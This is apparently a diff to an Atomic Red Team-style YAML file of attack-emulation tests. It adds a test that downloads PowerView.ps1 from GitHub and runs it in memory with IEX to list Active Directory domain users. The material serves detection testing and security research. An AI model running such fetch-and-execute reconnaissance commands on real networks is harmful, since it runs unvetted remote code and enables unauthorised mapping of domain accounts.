@@ -214,3 +214,13 @@ atomic_tests:
     elevation_required: false
     command: |
       Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=#{uac_prop})' -Server #{domain}
+- name: Get-DomainUser with PowerView
+  description: |
+    Utilizing PowerView, run Get-DomainUser to identify the domain users. Upon execution, Users within the domain will be listed.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -verbose
+    name: powershell
